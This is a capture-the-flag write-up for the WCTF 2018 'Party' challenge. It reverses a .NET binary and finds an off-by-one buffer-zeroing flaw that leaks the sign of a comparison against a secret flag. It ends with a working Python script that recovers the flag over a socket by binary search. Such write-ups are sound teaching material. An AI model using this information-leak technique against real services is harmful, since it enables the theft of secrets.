---
title: "Party - WCTF 2018"
date: "2018-07-08"
description: "Write-up for the Party challenge from WCTF 2018."
tags: ["wctf", "ctf", ".net", "scripting", "mhackeroni"]
showAuthor: false
---

{{< lead >}}
Authors: pietroferretti
{{< /lead >}}

>Give them an inch and they'll take a mile

## First look
The challenge is a small .NET PE binary.

Running the executable we can see that it can be run:

 - as a server, which holds a secret flag;
 - as a client, which sends messages to the server via socket and shows the replies in a dialog.

The server interface:

![server](/img/party_writeup/server.png)

The client interface:

![client](/img/party_writeup/client.png)

The user interface lets you define a list of "party guests", a list of "friendships" between them, and some "Erdos Scrutiny" parameter.
By clicking on "Evaluate Party" the parameters are sent to the server and evaluated according to some unknown criteria.
The server replies saying if Paul Erdos either approves or disapproves of the party.

Since there isn't any obvious way to interact with the flag from the client, we'd better look at the insides of the program.


## Reversing the binary
We decompiled the binary to better understand how the client communicates with the server.

Here is the decompiled source: [`ClientThread.cs`](/code/party_writeup/ClientThread.cs).

We found out that there are actually three different type of messages which the server accepts, depending on the first number sent to the socket:

 - 1: a simple echo service
 - 2: the "Erdos party approval" check that is actually used by the user interface
 - 3: a flag check service

### The flag check service
This service takes a number of strings, one per line, and for each checks if the string is equal to the flag.
The service then replies with "Correct" or "Incorrect" for each of the strings supplied.

As it is, this service is not very useful for us. Since the check is made on the whole flag, the only way we have to find the flag would be to fully bruteforce it, which is unfeasible.

Looking at the code though we can see that this is the **only** section of code where the flag is used. We are therefore forced to find some way to make use of it, or somehow leak the information elsewhere.

After looking at the code some more, we noticed that the `comm` buffer is used by both the flag check service and the erdos approval service.
There might exist some way for some information related to the flag to leak from the other service, as long as:

- the `comm` buffer is modified in a way that depends on the flag,
- the buffer is not cleared out when the approval service is used,
- the output of the approval service depends on the portion of content of `comm` that was modified by the flag check service.

The flag check is computed with the following code:

```c
int res = string.Compare(this.flag, strB, StringComparison.Ordinal);
// res is then saved into comm
```

We can see that the result of `string.Compare` (a 4-byte integer) is stored in `comm`, and therefore the first condition is satisfied.

Note: the result of the call is positive or negative depending on which of the two arguments would come first in the lexicographic order.
This means that if we manage to leak the content of `comm`, we could setup a binary search using the result of the `Compare` as a discriminator, and find the flag byte by byte.

### The Erdos approval service
Long story short, this service does the following:

- Given `n` a number of nodes, `l` edges, `s` threshold,
- build an undirected graph with `n` nodes and the `l` edges provided,
- check if
  - there are no fully connected subgraphs with more than or equal to `s` nodes
  - there are no fully disconnected subgraphs with more than or equal to `s` nodes

In this section of the program `comm` is used to store the edges of the graph, represented as single bits: 1 if the edge exists, 0 if it doesn't.

The following lines of codes are the ones supposed to zero out all the bytes needed to store the edges.

```c
int maxedgesbytes = (nodes * nodes - nodes) / 2 / 8;
for (int index = 0; index < maxedgesbytes; ++index)
  this.comm[2 + index] = (byte) 0;
```

The code makes sense (each node can have an edge with `nodes - 1` other nodes, the total number is divided by 2 since the graph is undirected),
but it's actually flawed: the division by 8 truncates the result, and prevents the last needed byte from being zeroed out.

This means any previous usage of `comm` can affect the representation of the graph edges, or, in other words, the content of `comm` can "add edges" to the graph.
For instance if some bits in that last byte were left to 1 from previous usages, the code would believe that the edges corresponding to those bits exist in the graph.

The immediate consequence is that the result of the erdos approval computation can also change depending from previous usages of `comm`.

This takes care of the second and third conditions we laid out previously, and prove that an attack is possible.

We now need to find some reliable way to guess the content of that leftover byte using the erdos approval check.

## The attack
We're interested in the sign of the `string.Compare` result, i.e. if the integer was positive or negative.

The integer is stored in `comm` as 4 bytes, in little-endian order, and, being signed, it probably uses the [two's complement](https://en.wikipedia.org/wiki/Two%27s_complement) representation.

With some tests we noticed that the absolute value of the result of `string.Compare` doesn't go over 2 bytes.
This mean that, using two's complement:

- if the result is positive, the most significant byte is all zeros
- if the result is negative, the most significant byte is all ones

Since the integer is saved in litte-endian order, the most significant byte is the 4th. 

The 4th byte can only assume two different values, and the erdos approval too: with the correct setup, there might be a way to reliably recover the sign of the result from a single erdos approval check.

Looking back at the `comm` zeroing out snippet:

```c
int maxedgesbytes = (nodes * nodes - nodes) / 2 / 8;
for (int index = 0; index < maxedgesbytes; ++index)
  this.comm[2 + index] = (byte) 0;
```

We want `maxedgesbytes` to reach the 4th byte, but not overwrite it. 
To achieve this we want to choose the number of nodes such that:
`((nodes * nodes - nodes) / 2 / 8) % 4 == 3 - 2`

(NB: `- 2` because `comm` is zeroed out starting from 2, but the compare results are stored starting from 0)

One of the values that fulfill this condition is 6 (among many others).

In the case of 6, the number of possible edges is `(6*6 - 6) / 2 = 15`.
The number of zeroed out bytes is `2 + (15/8) = 3`, leaving the 4th byte untouched but still used to represent the graph (we need two bytes to store 15 edges).

Consider this case:

- `n` = 6 nodes
- `l` = 0 edges
- threshold `s` = 6

Depending on the result of the `string.Compare` call:

- if the result is positive, the 4th byte is all zeros
  - no edges, we have a fully disconnected subgraph of size 6. Not approved.
- if the result is positive, the 4th byte is all ones
  - some edges exist,there is no fully disconnected or fully connected subgraph of size 6. Approved.

We can therefore find the value of the 4th byte and the sign of the comparison with the flag.

We have everything we need. 
We can now setup a binary search by adding a character at a time to our input and checking if the result of the compare is positive or negative.

The exploit:

```python
#!/usr/bin/env python3
from socket import socket
import time

host = '180.163.241.15'
port = 10658

def testflag(flag):
    sock = socket()
    sock.connect((host, port))
    # overwrite comm
    sock.send(b'3\n')
    sock.send(b'1\n')  # one line
    sock.send(flag.encode() + b'\n')
    res = b''
    while not (b'Correct' in res or b'Incorrect' in res):
        time.sleep(0.1)
        res += sock.recv(1024)
    print(res)
    if b'Correct' in res:
        return 0
    # leak sign bit
    sock.send(b'2\n')
    sock.send(b'6\n')  # 6 nodes
    sock.send(b'6\n')  # threshold = 6
    sock.send(b'0\n')  # no edges
    res = b''
    while not b'party' in res:
        time.sleep(0.1)
        res += sock.recv(1024)
    print(res)
    sock.close()
    if b'does not approve' in res:
        return 1  # flag is bigger
    elif b'approves' in res:
        return -1  # flag is smaller
    else:
        raise Exception('something wrong')

flag = ''
newchar = ''
for l in range(100):
    flag += newchar
    print(l)
    print(flag)
    minv = 0x20
    maxv = 0x7e
    while minv != maxv:
        newchar = chr(minv + (maxv - minv) // 2)
        newflag = flag + newchar
        print(minv, maxv)
        res = testflag(newflag)
        if res > 0:
            # character is too small, or the string is too short
            minv = minv + (maxv - minv + 1) // 2
        elif res < 0:
            # character is too big
            maxv = minv + (maxv - minv) // 2
        else:
            print('Flag found!', newflag)
            exit()
    # check off-by-one because of the different string length
    if testflag(flag + newchar) < 0:
        newchar = chr(ord(newchar) - 1)
```
